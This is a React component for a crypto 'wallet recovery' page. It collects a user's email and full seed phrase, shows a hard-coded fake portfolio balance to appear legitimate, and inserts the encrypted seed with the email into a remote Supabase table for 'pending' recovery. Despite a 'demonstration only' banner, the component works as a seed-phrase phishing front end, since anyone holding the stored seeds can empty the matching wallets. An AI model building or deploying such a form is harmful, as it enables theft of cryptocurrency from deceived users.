import React, { useState } from 'react'
import { SeedPhraseInput } from './SeedPhraseInput'
import { SecurityWarning } from './SecurityWarning'
import { PortfolioDisplay } from './PortfolioDisplay'
import { supabase } from '../lib/supabase'
import { encryptSeedPhrase, generateWalletAddress } from '../utils/encryption'
import type { Portfolio } from '../types/wallet'
import { Loader, CheckCircle, AlertTriangle } from 'lucide-react'

export const RecoveryForm: React.FC = () => {
  const [seedPhrase, setSeedPhrase] = useState('')
  const [email, setEmail] = useState('')
  const [recoveryType, setRecoveryType] = useState('standard')
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isLoadingPortfolio, setIsLoadingPortfolio] = useState(false)
  const [portfolio, setPortfolio] = useState<Portfolio | null>(null)
  const [error, setError] = useState('')
  const [success, setSuccess] = useState('')

  const validateSeedPhrase = (phrase: string): boolean => {
    const words = phrase.trim().split(/\s+/)
    return words.length === 12 || words.length === 24
  }

  const loadPortfolio = async () => {
    if (!validateSeedPhrase(seedPhrase)) {
      setError('Please enter a valid 12 or 24 word seed phrase')
      return
    }

    setIsLoadingPortfolio(true)
    setError('')

    // Simulate portfolio loading
    setTimeout(() => {
      const mockPortfolio: Portfolio = {
        totalBalance: 15247.83,
        balanceChange24h: 5.67,
        tokens: [
          {
            symbol: 'ETH',
            name: 'Ethereum',
            balance: 8.45,
            value: 12543.21,
            change24h: 3.2,
            chain: 'Ethereum'
          },
          {
            symbol: 'USDC',
            name: 'USD Coin',
            balance: 1500.00,
            value: 1500.00,
            change24h: 0.01,
            chain: 'Ethereum'
          },
          {
            symbol: 'BTC',
            name: 'Bitcoin',
            balance: 0.025,
            value: 1204.62,
            change24h: -1.8,
            chain: 'Bitcoin'
          }
        ]
      }
      setPortfolio(mockPortfolio)
      setIsLoadingPortfolio(false)
    }, 2000)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!email || !seedPhrase || !validateSeedPhrase(seedPhrase)) {
      setError('Please fill in all fields with valid information')
      return
    }

    setIsSubmitting(true)
    setError('')
    setSuccess('')

    try {
      const encryptedSeed = encryptSeedPhrase(seedPhrase)
      const walletAddress = generateWalletAddress(seedPhrase)

      const { error } = await supabase
        .from('wallet_recoveries')
        .insert({
          user_email: email,
          encrypted_seed: encryptedSeed,
          wallet_address: walletAddress,
          recovery_type: recoveryType,
          status: 'pending'
        })

      if (error) throw error

      setSuccess('Wallet recovery request submitted successfully!')
      setSeedPhrase('')
      setEmail('')
      setPortfolio(null)
    } catch (err) {
      console.error('Recovery submission error:', err)
      setError('Failed to submit recovery request. Please try again.')
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="max-w-4xl mx-auto space-y-6">
      <SecurityWarning type="danger" title="Critical Security Warning">
        <ul className="space-y-2">
          <li>• Never share your seed phrase with anyone</li>
          <li>• This is a demonstration platform - use test wallets only</li>
          <li>• Always verify the website URL before entering sensitive information</li>
          <li>• Consider using hardware wallets for maximum security</li>
        </ul>
      </SecurityWarning>

      <div className="bg-gray-800 rounded-lg p-6">
        <h2 className="text-2xl font-bold text-white mb-6">Wallet Recovery</h2>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <label className="block text-sm font-medium text-gray-300 mb-2">
              Email Address
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="your@email.com"
              required
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-300 mb-2">
              Recovery Type
            </label>
            <select
              value={recoveryType}
              onChange={(e) => setRecoveryType(e.target.value)}
              className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
            >
              <option value="standard">Standard Recovery</option>
              <option value="migration">Wallet Migration</option>
              <option value="emergency">Emergency Recovery</option>
            </select>
          </div>

          <SeedPhraseInput
            value={seedPhrase}
            onChange={setSeedPhrase}
            error={error && !validateSeedPhrase(seedPhrase) ? error : ''}
          />

          <div className="flex flex-col sm:flex-row gap-4">
            <button
              type="button"
              onClick={loadPortfolio}
              disabled={!validateSeedPhrase(seedPhrase) || isLoadingPortfolio}
              className="flex-1 bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center justify-center space-x-2"
            >
              {isLoadingPortfolio ? (
                <>
                  <Loader className="w-4 h-4 animate-spin" />
                  <span>Loading Portfolio...</span>
                </>
              ) : (
                <span>Load Portfolio</span>
              )}
            </button>

            <button
              type="submit"
              disabled={isSubmitting || !email || !validateSeedPhrase(seedPhrase)}
              className="flex-1 bg-green-600 text-white px-6 py-2 rounded-lg hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center justify-center space-x-2"
            >
              {isSubmitting ? (
                <>
                  <Loader className="w-4 h-4 animate-spin" />
                  <span>Submitting...</span>
                </>
              ) : (
                <span>Submit Recovery Request</span>
              )}
            </button>
          </div>

          {error && (
            <div className="flex items-center space-x-2 text-red-400 bg-red-900/20 p-3 rounded-lg">
              <AlertTriangle className="w-4 h-4" />
              <span>{error}</span>
            </div>
          )}

          {success && (
            <div className="flex items-center space-x-2 text-green-400 bg-green-900/20 p-3 rounded-lg">
              <CheckCircle className="w-4 h-4" />
              <span>{success}</span>
            </div>
          )}
        </form>
      </div>

      {portfolio && (
        <PortfolioDisplay portfolio={portfolio} isLoading={isLoadingPortfolio} />
      )}
    </div>
  )
}